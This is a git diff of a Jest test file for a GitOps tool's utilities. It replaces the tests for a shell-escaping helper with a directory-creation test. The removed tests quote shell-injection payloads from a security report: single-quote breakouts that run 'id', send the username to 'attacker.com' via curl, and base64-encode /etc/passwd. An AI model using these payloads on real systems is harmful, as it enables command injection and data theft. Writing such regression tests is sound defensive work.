@@ -1,7 +1,7 @@
-import * as utils from './utils'
 import * as fsUtils from 'fs/promises'
 import { readFile } from 'fs/promises'
 import * as debugTools from './debug'
+import * as utils from './utils'
 
 describe('Flatten objects', () => {
   it('should be flattened', () => {
@@ -83,45 +83,19 @@ describe('ensureTeamGitopsDirectories', () => {
   })
 })
 
-describe('escapeGucciValue', () => {
-  it('returns the value as a string', () => {
-    expect(utils.escapeGucciValue('hello')).toBe('hello')
-  })
+describe('ensureManifestDirectories', () => {
+  it('creates the apl-addons namespace directory', async () => {
+    const deps = {
+      access: jest.fn().mockRejectedValue(new Error('missing')),
+      mkdir: jest.fn(),
+      writeFile: jest.fn(),
+    }
 
-  it('returns an empty string for null', () => {
-    expect(utils.escapeGucciValue(null)).toBe('')
-  })
+    await utils.ensureManifestDirectories(deps)
 
-  it('returns an empty string for undefined', () => {
-    expect(utils.escapeGucciValue(undefined)).toBe('')
-  })
-
-  it('does not alter values without single quotes', () => {
-    expect(utils.escapeGucciValue('safe-value_123')).toBe('safe-value_123')
-  })
-
-  it('converts numbers to strings', () => {
-    expect(utils.escapeGucciValue(42)).toBe('42')
-  })
-
-  // Payloads from KMS publicKey single-quote breakout security report
-  it('does not return the raw injection payload unchanged', () => {
-    const payload = "';id>/tmp/proof&&curl attacker.com/$(whoami);'"
-    expect(utils.escapeGucciValue(payload)).not.toBe(payload)
-  })
-
-  it('prevents KMS publicKey single-quote breakout', () => {
-    // Without escaping this produces: -s keys='';id>/tmp/proof&&curl attacker.com/$(whoami);''
-    // The '' closes the single-quoted arg, letting ;id>... execute as a shell command.
-    // Each ' must become '\'' so the value remains inside a quoted context.
-    const payload = "';id>/tmp/proof&&curl attacker.com/$(whoami);'"
-    expect(utils.escapeGucciValue(payload)).toBe(`'\\'';id>/tmp/proof&&curl attacker.com/$(whoami);'\\''`)
-  })
-
-  it('prevents subshell command substitution breakout via publicKey', () => {
-    // Variant using $() inside the single-quote breakout
-    const payload = "';curl $(cat /etc/passwd|base64);'"
-    expect(utils.escapeGucciValue(payload)).toBe(`'\\'';curl $(cat /etc/passwd|base64);'\\''`)
+    expect(deps.mkdir).toHaveBeenCalledWith(expect.stringMatching(/env\/manifests\/namespaces\/apl-addons$/), {
+      recursive: true,
+    })
   })
 })
 
